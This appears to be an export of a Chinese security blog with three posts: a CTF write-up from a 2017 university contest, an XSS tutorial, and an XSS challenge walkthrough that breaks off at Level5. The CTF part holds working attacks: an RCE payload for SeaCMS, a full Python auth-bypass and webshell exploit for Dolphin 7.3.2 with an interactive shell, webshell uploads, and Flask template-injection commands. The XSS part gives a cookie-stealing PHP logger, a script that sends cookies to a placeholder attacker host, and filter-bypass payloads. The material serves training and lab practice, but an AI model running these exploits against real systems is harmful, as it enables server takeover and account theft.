<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/213335213.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/213345685.png" alt="mark"></p>
<h2 id="No-8-看视频真嗨皮（读：50分，写：100分）"><a href="#No-8-看视频真嗨皮（读：50分，写：100分）" class="headerlink" title="No.8 看视频真嗨皮（读：50分，写：100分）"></a>No.8 看视频真嗨皮（读：50分，写：100分）</h2><pre><code>提交
关键字词：一档靶标题
===============================================================
周末看个电影放松一下吧！</code></pre>
<p><a href="http://0day5.com/archives/4249/">海洋cms v6.45前台getshell漏洞</a></p>
<p>payload：</p>
<pre><code>url：http://6f781364dedf5dc1eb877079f415877b.xnuca.cn/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//
post:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=phpinfo();</code></pre>
<p>phpinfo()正常执行。</p>
<p>通过system函数执行命令。<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png" alt="1"><br>找flag位置<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms1.png" alt="2"><br>查询flag<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms2.png" alt="3"><br>创建文件<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms3.png" alt="4"></p>
<h2 id="NO-9-The-Best-Community"><a href="#NO-9-The-Best-Community" class="headerlink" title="NO.9 The Best Community"></a>NO.9 The Best Community</h2><p>Dolphin &lt;= 7.3.2 绕过验证 + 远程代码执行</p>
<p>直接利用脚本:</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-
&#39;&#39;&#39;
Software : Dolphin &lt;= 7.3.2 Auth bypass / RCE exploit
Vendor : www.boonex.com
Author : Ahmed sultan (0x4148)
Home : 0x4148.com | https://www.linkedin.com/in/0x4148
Email : 0x4148@gmail.com
Auth bypass trick credit go to Saadat Ullah
&#39;&#39;&#39;
import os
import sys
import urllib
import urllib2
import ssl
import base64
print &quot;[+] Dolphin &lt;= 7.3.2 Auth bypass / RCE exploit&quot;
print &quot;[+] Author : Ahmed sultan (0x4148)&quot;
print &quot;[+] Home : 0x4148.com\n&quot;
if len(sys.argv)&lt;2:
    print &quot;\nUsage : python &quot;+sys.argv[0]+&quot; http://HOST/path/\n&quot;
    sys.exit();
hosturl=sys.argv[1]
fields = &#123;&#39;csrf_token&#39;: &#39;Aint give a shit about csrf stuff ;)&#39;, &#39;submit_upload&#39;: &#39;0x4148&#39;&#125;
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
def generate_http_request(fields):
    lmt = &#39;---------------------------&#39;
    crlf = &#39;\r\n&#39;
    x4148mltprt = []
    x4148mltprt.append(&#39;--&#39; + lmt)
    if fields:
        for (key, value) in fields.items():
            x4148mltprt.append(&#39;Content-Disposition: form-data; name=&quot;%s&quot;&#39; % key)
            x4148mltprt.append(&#39;&#39;)
            x4148mltprt.append(value)
            x4148mltprt.append(&#39;--&#39; + lmt)
    x4148mltprt.append(&#39;Content-Disposition: form-data; name=&quot;module&quot;; filename=&quot;0x4148.zip&quot;&#39;)
    x4148mltprt.append(&#39;Content-Type: application/zip&#39;)
    x4148mltprt.append(&#39;&#39;)
    x4148mltprt.append(&quot;PK\x03\x04\x0a\x00\x00\x00\x00\x00RanIj\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x000x4148fo.php&quot;
    &quot;&lt;?php\x0d\x0aeval(base64_decode($_POST[\&#39;0x4148\&#39;]));\x0d\x0a?&gt;PK\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00RanIj&quot;
    &quot;\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x00\x00\x00\x000x4148fo.php&quot;
    &quot;PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00:\x00\x00\x00[\x00\x00\x00\x00\x00&quot;)
    x4148mltprt.append(&#39;--&#39; + lmt + &#39;--&#39;)
    x4148mltprt.append(&#39;&#39;)
    body = crlf.join(x4148mltprt)
    content_type = &#39;multipart/form-data; boundary=%s&#39; % (lmt)
    return content_type, body
content_type, body = generate_http_request(fields)
print &quot; + Sending payload to &quot;+hosturl.split(&quot;//&quot;)[1].split(&quot;/&quot;)[0]
req = urllib2.Request(hosturl+&quot;/administration/modules.php&quot;,body)
req.add_header(&#39;User-agent&#39;, &#39;Mozilla 15&#39;)

req.add_header(&quot;Cookie&quot;, &quot;memberID=1; memberPassword[]=0x4148;&quot;)
req.add_header(&#39;Referer&#39;, hosturl+&quot;/administration/modules.php&quot;)
req.add_header(&#39;Content-Type&#39;, content_type)
req.add_header(&#39;Content-Length&#39;, str(len(body)))
req.add_header(&#39;Accept&#39;, &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;)
try:
    urllib2.urlopen(req,context=gcontext).read()
except urllib2.HTTPError, e:
    err=e.fp.read()
    print err
    sys.exit()
print &quot; * Checking if payload was send&quot;
data = urllib.urlencode(&#123;&#39;0x4148&#39;:&#39;echo &quot;0x4148foooo&quot;;&#39;.encode(&#39;base64&#39;)&#125;)
req = urllib2.Request(hosturl+&#39;/tmp/0x4148fo.php&#39;, data)
if urllib2.urlopen(req).read().find(&quot;0x4148foooo&quot;)==-1:
    print &quot; - Exploitation failed&quot;
    print req
    sys.exit()
print &quot; + php prompt up and running\n + type &#39;shell&#39; to get shell access&quot;
while True:
    request=str(raw_input(&quot;\nphp&gt;&gt; &quot;))
    if request==&quot;exit&quot;:
        sys.exit()
    if request==&quot;shell&quot; or request==&quot;cmd&quot;:
        print &quot;\n + Switched to Shell mode\n + Type &#39;return&#39; to return to php prompt mode&quot;
        while True:
            cmd=str(raw_input(&quot;\n0x4148@&quot;+hosturl.split(&quot;//&quot;)[1].split(&quot;/&quot;)[0]+&quot;# &quot;))
            if cmd==&quot;return&quot;:
                break
            if cmd==&quot;exit&quot;:
                sys.exit()
            kkk=&quot;passthru(&#39;&quot;+cmd+&quot;&#39;);&quot;
            data = urllib.urlencode(&#123;&#39;0x4148&#39;:kkk.encode(&#39;base64&#39;)&#125;)
            req = urllib2.Request(hosturl+&#39;/tmp/0x4148fo.php&#39;, data)
            print urllib2.urlopen(req).read()
    data = urllib.urlencode(&#123;&#39;0x4148&#39;:request.encode(&#39;base64&#39;)&#125;)
    req = urllib2.Request(hosturl+&#39;/tmp/0x4148fo.php&#39;, data)
    print urllib2.urlopen(req).read()</code></pre>
<h2 id="No-11-两只小蜜蜂啊"><a href="#No-11-两只小蜜蜂啊" class="headerlink" title="No.11 两只小蜜蜂啊"></a>No.11 两只小蜜蜂啊</h2><p>直接后台弱口令</p>
<pre><code>http://6b4d6f19e2505e939db9fe549355dffd.xnuca.cn/admin/admin.php</code></pre>
<pre><code>username: admin
password：admin</code></pre>
<p>查资料可知有文件上传漏洞</p>
<p><img src="http://osn75zd5c.bkt.clouddn.com/2017%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-no.11.png"></p>
<p>服务器只检查了</p>
<pre><code>Content-Type: image/jpeg</code></pre>
<p>然后就将上传原文件的扩展名拼接到服务器的新文件中，然后返回了路径</p>
<pre><code>img/201708261744154724.php</code></pre>
<p>由于有360网站卫士，因此上传一个免杀一句话，然后用菜刀连接</p>
<pre><code>http://41ff54ee00cc234605b67f6442c5a7e7.xnuca.cn/upload/img/201708261842507460.php</code></pre>
<p>连接后直接终端执行命令</p>
<pre><code>[/var/www/html/upload/img/]$ whereis flag
flag: /etc/flag.txt</code></pre>
<p>获得读的flag，然后在按照要求上传指定文件名到writeHere目录下。<br>即可获得读和写的全部分数</p>
<h2 id="NO-16-来一发flask"><a href="#NO-16-来一发flask" class="headerlink" title="NO.16 来一发flask"></a>NO.16 来一发flask</h2><p>Flask的SQL注入，由于没法直接浏览器内修改数据，所以用Burpsuite抓包修改</p>
<p>Thx to <a href="https://github.com/73696e65">@73696e65</a></p>
<pre><code>GET /&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/flag.txt').read()&#125;&#125; HTTP/1.1

GET /&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('from%20subprocess%20import%20check_output\n\nRUNCMD%20=%20check_output\n')&#125;&#125; HTTP/1.1

GET /&#123;&#123;config.from_pyfile('/tmp/owned.cfg')&#125;&#125; HTTP/1.1

GET /&#123;&#123;config['RUNCMD']('locate writeHere',shell=True)&#125;&#125; HTTP/1.1

GET /&#123;&#123;config['RUNCMD']('touch /../../.........',shell=True)&#125;&#125; HTTP/1.1</code></pre>
<h2 id="NO-21-Freecms"><a href="#NO-21-Freecms" class="headerlink" title="NO.21 Freecms"></a>NO.21 Freecms</h2><p>下载freecms-1.4的源码，查看后发现存在Struts2-045的漏洞，利用现成工具</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/221220165.png" alt="mark"></p>
<h2 id="No-23-找入口（读：100分，写：200分）"><a href="#No-23-找入口（读：100分，写：200分）" class="headerlink" title="No.23 找入口（读：100分，写：200分）"></a>No.23 找入口（读：100分，写：200分）</h2><pre><code>提交
关键字词：二档靶标题
===============================================================
本站的基本职能是什么</code></pre>
<p>找到网站后台，发现后台是弱口令<code>username=admin&amp;password=admin</code>。</p>
<p><a href="http://www.freebuf.com/articles/web/138640.html">wolfcms 任意文件上传</a></p>
<p>后台直接上传shell，根据前台的logo找到对应的路径。</p>
<p>按照上一题的套路查看flag，写文件。<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk1.png" alt="5"><br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk2.png" alt="6"></p>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2017/03/11/xss/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="0X01-什么是XSS？"><a href="#0X01-什么是XSS？" class="headerlink" title="0X01 什么是XSS？"></a>0X01 什么是XSS？</h2><p>​    本名是CSS（Cross Site Scripting)，即跨站脚本攻击。为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。关键在于在网页中嵌入脚本代码。</p>
<h2 id="0X02-XSS原理"><a href="#0X02-XSS原理" class="headerlink" title="0X02 XSS原理"></a>0X02 XSS原理</h2><p>​    XSS攻击通过在网页中嵌入客户端恶意脚本代码来实现盗取Cookie、改变网页内容、URL调转等目的。一般是通过JavaScript语言编写的JS脚本代码，因为JS是广泛使用的网络脚本语言主要用来向HTML页面添加交互行为，可以直接嵌入HTML页面。JS代码可以直接被浏览器解析这样就可以通过在页面嵌入或跨站执行JS代码达到攻击的目的。实际攻击中，往往通过<code>&lt;script src=&quot;http://xxxxxx&quot;&gt;&lt;/script&gt;</code>来加载外部脚本，这样就可以在外部准备好实现目的的脚本，这样不会被原网页的一些条件限制，只要一个链接就可以加载外部脚本实现攻击。</p>
<h2 id="0X03-XSS类型"><a href="#0X03-XSS类型" class="headerlink" title="0X03 XSS类型"></a>0X03 XSS类型</h2><p>​    主要分为三类：反射型、储存型、DOM型。</p>
<h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1. 反射型"></a>1. 反射型</h3><p>​    也称为非持久性XSS，过程是用户访问一个带有XSS的URL请求时（需要用户访问进行触发），服务器端接收数据后处理，然后把带有XSS代码的数据发回浏览器，浏览器解析这带有XSS代码的数据，造成XSS漏洞。因为过程像反射所以有了这个名字。</p>
<p>​    一个例子：</p>
<pre><code>&lt;?php
    $username = $_GET[&#39;username&#39;];
    echo $username;
?&gt;    </code></pre>
<p>​    这段代码的作用就是接受username值并输出，这里就存在反射型XSS，如果在这里输入<code>&lt;script&gt;XSS恶意代码&lt;/script&gt;</code>,就会造成反射型XSS漏洞。</p>
<h3 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h3><p>​    也称为持久型XSS，因为会将数据存储在服务器端，这样的话会造成持久性的危害。相对于反射型XSS,这种漏洞更为”持久”,因为用户输入不仅仅被输出在了html中,而且还储存到了数据库中,这样每次访问这个页面时就会形成一次XSS，导致访问某个页面的用户会长期遭到攻击。它和另外两个的区别在于反射型和DOM型需要用户手动触发，而储存型不需要。常见出现的地方是留言板,微博,bbs等，有的网站个人资料设置也有这个问题存在。</p>
<p>​    输入的值会被插入到HTML中储存，所以要确定好输入点和输出点，输出的地方是在标签内还是标签属性内还是其他地方，如果在属性内，代码是不会执行的。所以想法闭合标签使输出不在属性中。比如下面这个，输出点在Value属性内，就要构造闭合标签。</p>
<pre><code>&lt;inpute type=&quot;text&quot; name=&quot;content&quot; value=&quot;内容&quot;/&gt;
构造代码闭合标签： &quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
得到的效果：&lt;inpute type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;</code></pre>
<p>可以看到这样闭合后xss语句就在标签属性外了。</p>
<h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h3><p>​    DOM：即文档对象模型（Document Object Model），DOM实际上是以面向对象方式描述的文档模型。DOM定义了表示和修改文档所需的对象、这些对象的行为和属性以及这些对象之间的关系。可以把DOM认为是页面上数据和结构的一个树形表示，不过页面当然可能并不是以这种树的方式具体实现。通过 JavaScript，您可以重构整个 HTML 文档。您可以添加、移除、改变或重排页面上的项目。使用DOM可以允许程序和脚本动态的访问和更新文档内容、结构和样式。DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档。根据DOM规定，HTML文档的每个成员是一个节点。HTML的标签都是一个个节点，而这些节点组成了DOM的整体结构：节点树。其实打开Chrome的开发者工具element模块可以看到网页的DOM结构。</p>
<p>​    下面是一段经典的DOM型XSS示例</p>
<pre><code>&lt;script&gt;
    var temp = document.URL ;   //获取URL
    var index = document.URL.indexOf(&quot;content=&quot;)+4;
    var par = temp.substring(index);
    document.write(decodeURL(par));   //输入获取内容
&lt;/script&gt;    </code></pre>
<p>上诉代码的意思是获取URL中content参数的值，并且输出，如果输入<code>http://xxxx.html?content=&lt;script&gt;alert(//xss)&lt;/script&gt;</code>,就会产生XSS漏洞。</p>
<blockquote>
<p>Flash XSS</p>
<p>Flash XSS也叫XSF（Cross Site Flash）,准确的说XSF应该算是XSS的分支，因为在XSS使用到的技巧，在XSF中只有一部分可以使用，而且XSF是基于ActionScript语言的。</p>
<p>不常用到：一篇文章–&gt;<a href="https://www.secpulse.com/archives/44299.html">https://www.secpulse.com/archives/44299.html</a></p>
</blockquote>
<h3 id="0X04-XSS漏洞的挖掘"><a href="#0X04-XSS漏洞的挖掘" class="headerlink" title="0X04 XSS漏洞的挖掘"></a>0X04 XSS漏洞的挖掘</h3><p>​    检测XSS时，选择有特殊意义的字符，可有快速检测是否存在XSS。例如<code>&lt;,&gt;,&quot;,&#39;,()</code>等，提交后查看源代码看看这些输入是否被转义。在测试时输入可以加上一些明显的标记便于寻找如AAAAA。在没办法看源码时不知道输出位子可以输入<code>&quot;/&gt;XSStest</code>来测试。也可以用工具来扫描XSS漏洞。</p>
<p>​    一般通过插入xss代码后页面的弹窗或浏览器脚本错误来判断是否存在xss漏洞。对于xss，找到输入输出位置很重要，有时候输出位置就在输入页面，有时候有提示，有时候什么都不知道，所以找好输出位置很重要。</p>
<h4 id="1-反射型XSS的挖掘"><a href="#1-反射型XSS的挖掘" class="headerlink" title="1.反射型XSS的挖掘"></a>1.反射型XSS的挖掘</h4><p>基本分4种情况：HTML标签之间，HTML标签之内，JavaScript代码的值，CSS代码的值。</p>
<ul>
<li><p>HTML标签之间</p>
<p>最常出现的场景是<code>&lt;div&gt;&lt;/div&gt;</code>之间，这样我们提交的XSS代码是可以直接触发的。例如<code>&lt;div&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/div&gt;</code>,如果是<code>&lt;title&gt;&lt;/title&gt;</code>这样的标签中，插入的JS代码直接作为文本输出了，并没有执行，要先闭合标签，例如这个payload<code>&lt;/textarea&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;textarea&gt;</code>。</p>
</li>
<li><p>HTML标签之内</p>
<p>最普通的场景是出现在<code>&lt;input value=“[输出]”/&gt;</code>位置上,对于这种情况，•跟之前一样，闭合标签，提交的payload：<code>”&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;input value=“</code>,•另外一种就是闭合属性，然后利用一些事件来触发XSS，提交的payload：<code>”onmouseover=alert(1) x=“</code>,后面的一个例题就用到了这个。•如果输出在src/href/action等属性内，例如<code>&lt;a href=“[输出]”&gt;&lt;/a&gt;</code>,我们除了可以闭合标签外，还可以用<code>javascript:alert(1)//</code>,<code>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=</code></p>
</li>
<li><p>JavaScript代码的值</p>
<p>有些javascript代码是服务端输出的，有时候会将用户输入的值一起输出，例如<code>&lt;script&gt;a=“[输出]”；&lt;/script&gt;</code>,可以像上面那样闭合标签，也可以闭合变量值<code>”;alert(1);//</code>,也可以利用<code>&lt;script&gt;</code>标签的闭合机制，它会优先寻找最近的一个<code>&lt;/script&gt;</code>闭合.payload:<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></p>
</li>
<li><p>CSS代码的值</p>
<p>出现在<code>body&#123;color:[输出];&#125;</code>的位置上,只存在于IE了，payload：<code>1;xss:expression(if(!window.x)&#123;alert(1);window.x=1;&#125;)</code></p>
</li>
</ul>
<h4 id="2-储存型XSS的挖掘"><a href="#2-储存型XSS的挖掘" class="headerlink" title="2.储存型XSS的挖掘"></a>2.储存型XSS的挖掘</h4><blockquote>
<p>根据上面对“反射型XSS挖掘”的学习，其实存储型XSS挖掘也就差不多了，只不过这里一般是表单的提交，然后进入服务端存储中，最终会在某个页面上输出，输出的位置有以下几种情况：</p>
<p>•表单提交后跳转到的页面有可能就是输出点</p>
<p>•表单所在的页面也有可能是输出点</p>
<p>•表单提交后不见了，具体的页面不清楚，得一个一个页面的去找</p>
</blockquote>
<h3 id="0X05-XSS利用"><a href="#0X05-XSS利用" class="headerlink" title="0X05 XSS利用"></a>0X05 XSS利用</h3><pre><code>#### 1.盗取Cookie</code></pre>
<p>​    把获取文件放在自己搭的网站服务器下。代码如下，stealcookies.php</p>
<pre><code>&lt;?php
$ua = $_SERVER[&quot;HTTP_USER_AGENT&quot;];
$client_ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
$method = $_SERVER[&quot;REQUEST_METHOD&quot;];
$referer = $_SERVER[&quot;HTTP_REFERER&quot;];
$date = date(&quot;F j, Y, g:i a&quot;);
$querystring = $_SERVER[&quot;QUERY_STRING&quot;];
$log = fopen(&quot;cookie.txt&quot;,&quot;a+&quot;);
$str= &quot;IP: $client_ip |Useragent: $ua | Method: $method | REF: $referer | Date: $date  | Cookie: $querystring \n&quot;;
fwrite($log,$str);
?&gt;</code></pre>
<p>​    构造XSS语句</p>
<pre><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://xxxxxx/stealcookies.php?a=&#39; + encodeURI(document.cookie) + &#39;&quot;/&gt;&#39;)&lt;/script&gt;</code></pre>
<p>​    把上面的语句放到XSS的目标中，最好是存储型xss，比如某个博客或者论坛什么的存在存储型XSS，在里面发一篇帖子或者留上评论，内容就是上述语句，当其他用户或者管理员打开这个评论或者帖子链接后，就会触发，然后跳转到http ://xxxxxx/cookie.asp?msg=’+document.cookie的页面，然后当前账户的cookie信息就当成参数发到网站下的文件里了。然后的然后就可以那这个cookie登陆了。。。。。。</p>
<h4 id="2-XSS-Framework"><a href="#2-XSS-Framework" class="headerlink" title="2.XSS Framework"></a>2.XSS Framework</h4><p>​    XSS漏洞利用框架，就是XSS利用的代码组合，但是进行了整合并且还有图形化的界面，使用起来十分方便。网上有源码，自己搭一个就能用。</p>
<h4 id="3-XSS-GetShell"><a href="#3-XSS-GetShell" class="headerlink" title="3.XSS GetShell"></a>3.XSS GetShell</h4><p>​    需要特定的场景下才能实现。DedeCMSV57_GBK_SP1版本就可以实现，书中的例子就是这个环境。因为title变量没进行过滤，在XSS语句通过$title传到了数据库。</p>
<h2 id="0X06-防范"><a href="#0X06-防范" class="headerlink" title="0X06 防范"></a>0X06 防范</h2><p>​    知道如何防范XSS也有利于进行XSS攻击，所谓知己知彼百战不殆。</p>
<p>​    防范的关键就是不让XSS语句能够执行。所以一般对输入的内容进行过滤以破坏XSS正常语句。</p>
<p>​    在PHP中提供了htmlspecialchars()、htmlentities()函数可以把一些预定义的字符转换为HTML实体。</p>
<p>预定义字符如下：</p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">HTML实体</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;</td>
<td align="center">&amp;amp</td>
</tr>
<tr>
<td align="center">“</td>
<td align="center">&amp;quot</td>
</tr>
<tr>
<td align="center">‘</td>
<td align="center">&amp;#039</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">&amp;lt</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">&amp;gt</td>
</tr>
</tbody></table>
<p>​    经过转义后构造的代码已经起不到作用了。</p>
<p>​    JSOUP：其过滤方式采取白名单方式。whitelist清理器能够在服务器端对用户输入的HTML进行过滤，只输出一些安全的标签和属性。而其配置可以根据自己所需修改。</p>
<p>​    OWASP Esapi：提供一系列的编码操作，通过编码，破环输入的XSS代码。</p>
<p>​    HttpOnly：httponly标注的cookie值无法被JavaScript获取。往往passwd都标注了httponly。</p>
<h2 id="0X07-绕过"><a href="#0X07-绕过" class="headerlink" title="0X07 绕过"></a>0X07 绕过</h2><ol>
<li>  过滤会改变代码 ，所以我们不能直接这么写代码。但我们可以尝试改变 javascript的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。例如 URL 编码：<code>&lt;a   href=&quot;java&amp;#115;cript:alert (&#39;xss&#39;)&quot;&gt;link&lt;/a&gt;</code>上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。</li>
<li>  利用空格。许多过滤匹配特殊的标签，包括起始与结束尖括号。但是，许多浏览器接受结束括号前的空白符，允许攻击者轻易避开这种过滤。例如：<code>&lt;script &gt;</code></li>
<li>  因为许多人用小写字符编写HTML代码，所以一些过滤仅检查常用的小写恶意标签。例如：<code>&lt;ScRiPt&gt;</code>，通过改变字符大小写避开过滤。</li>
<li>  一些过滤匹配任何成对的起始与结束尖括号，删除其中的任何内容，但通常可以依靠周围现有的语法，结束注入的标签，从而避开这种过滤。例如：可以控制下面代码中的value属性值：<code>&lt;input type=&quot;hidden&quot; name=&quot;pageid&quot; value=&quot;foo&quot;&gt;</code>就可以使用以下不会被过滤阻止的脚本，注入一个包含JavaScript的新标签：<code>foo&quot;&gt;&lt;x styple=&quot; x:expression(alert(document.cookie))</code>许多情况下，浏览器接受未结束的HTML标签；攻击者可以利用这种行为避开过滤。通过构造类似下面无效的HTML代码：<code>&lt;img src=&quot;&quot; onerror=alert&#123;document.cookie&#125;</code></li>
<li>  一些过滤匹配成对的起始与结束尖括号，提取其中的内容，并将这些内容与标签名称黑名单进行比较。可以通过使用多余的括号避开过滤。<code>&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;</code></li>
<li>  即使空字节后面的文本仍然在应用程序的响应中返回，但如果遇到空字节，一些过滤会停止处理字符串。在被过滤的表达式前插入一个URL编码的空字节即可避开这种过滤。<code>foo%00&lt;script&gt;</code></li>
<li>  如果用户提交的数据在应用过滤后还进行了规范化，仍可以通过URL编码或双重编码被过滤的表达式，避开过滤，并对漏洞进行利用。</li>
<li>  在gbk或gbXXX编码中可以通过宽字节绕过<code>%bf\、%df、%81</code></li>
<li>  CRLF注入绕过，利用<code>\r\n</code>在HTTP响应头注入回车换行符，并注入X-XSS-Protection: 0，可以防止脚本运行被阻止。</li>
<li>  IE同域白名单–Referer来源为本域则XSS Filter不生效</li>
<li>  Chorme同域白名单–标签嵌入的是同域内的js文件，XSS Filter就不会防御</li>
<li>  编码(url编码等)</li>
<li>  代码混淆(例如：jsfk)</li>
</ol>
<blockquote>
<blockquote>
<p>检测流程</p>
<p>1.输入任意数据，寻找输出点</p>
<p>2.输入&lt; &gt; \ “ ‘ / 等字符，查看过滤情况</p>
<p>3.分析输出所在的环境（以html还是js解析）</p>
<p>4.构造payload</p>
<p>5.盲打</p>
<p>常用语句</p>
<p>•<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>   弹出提示框</p>
<p>•<code>&lt;img src=“javascript:alert(1)”&gt;</code>         弹出提示框</p>
<p>•<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>     弹出用户COOKIES</p>
<p>•<code>&lt;iframe src=http://www.baidu.com&gt;&lt;/iframe&gt;</code>  在当前页插入另一站点</p>
</blockquote>
<p>•<a href="http://www.freebuf.com/sectool/4799.html">http://www.freebuf.com/sectool/4799.html</a>     （beef + msf）</p>
<p>•<a href="http://www.freebuf.com/articles/web/24372.html">http://www.freebuf.com/articles/web/24372.html</a>  （xssf + msf）</p>
</blockquote>
<h2 id="0X08-题目"><a href="#0X08-题目" class="headerlink" title="0X08 题目"></a>0X08 题目</h2><p>1-<a href="http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php">—&gt;链接&lt;—</a>这是一个XSS基础题</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/175900242.PNG" alt="mark"></p>
<p>在输入框中输入<code>&lt;script&gt;alert(1)&lt;/script&gt;  </code>，弹窗有提示：</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/180128794.png" alt="mark"></p>
<p>把1换掉就出flag了。。</p>
<p>2-<a href="http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php">—&gt;链接&lt;—</a></p>
<p>​    输入第一题的payload，出现这个，xss被检测出来了。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/234247518.png" alt="mark"></p>
<p>​    就不能这样写了，要想办法绕过。</p>
<p>​    输入<code>&lt;img src=# onerror=alert(&quot;success!&quot;) /&gt;</code>，过，得flag。</p>
<p>​    原因如下：用的img标签，src并没有给出图片路径。当图片没有找到路径（即src=“路径“找不到图片）就会弹出消息框,这个就是onerror=alert(xxxx)起的作用。</p>
<p>3<a href="http://192.168.139.231/web20/xss/index.php">—&gt;链接&lt;—</a></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170315/193427419.png" alt="mark"></p>
<p>有提示，要弹出cookie，还没有过滤，直接输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>就OK了。</p>
<p>4.</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170316/193146060.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170316/170834852.png" alt="mark"></p>
<p>​    onmouseenter事件 —当鼠标指针移动到图像时执行 JavaScript</p>
<p>​    将onmouseenter添加到输入框的标签中，当鼠标点击时执行js代码。</p>
]]></content>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS闯关游戏解题记录</title>
    <url>/2019/02/01/xss-chuang-guan-you-xi-jie-ti-ji-lu/</url>
    <content><![CDATA[<blockquote>
<p>今天在网上看到了这个Xss的闯关，就下下来做了一下。题目比较基础（有几个还不错），但写都写了就发上来吧。正好再找一些题目顺便总结一下，以后接着更新。</p>
</blockquote>
<a id="more"></a>

<blockquote>
<p>题目源码：</p>
<p>下载:<a href="https://www.lanzous.com/i32ah6d">https://www.lanzous.com/i32ah6d</a> 密码:h3fo</p>
</blockquote>
<h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>没有进行任何过滤，直接拼接XSS语句弹窗，进入下一关。</p>
<p>payload：</p>
<pre><code>level1.php?name=1&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;;</code></pre>
<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>有搜索框，随便输入测试，查看源码，发现输入的值直接赋值给了value并在input标签中。我们闭合掉前后的标签就可以了。</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l2-1.png"></p>
<p>Payload:</p>
<pre><code>level2.php?keyword=111&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;&amp;submit=搜索</code></pre>
<h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>和level2的布局一样，输入值会作为value值放在input标签中，不同的是转义了尖括号。</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l3-1.png"></p>
<p>但是可以使用onclick等事件来弹窗。</p>
<p>Payload:</p>
<pre><code>1&#39; onclick=alert(&#39;xss&#39;)//
1&#39; oninput=alert(&#39;xss&#39;)//</code></pre>
<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>==?</p>
<p>和L3的payload一样就过了。。（换成了双引号）</p>
<h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><p>将script和on进行了replace，在单词中间插入了<code>_</code>。这样就过滤了script标签和一众事件触发xss。</p>
<p>使用a标签+javascript伪协议来触发。（javascript为什么没被替换，看了一下源码替换的是&lt;script）</p>
<p>Payload:</p>
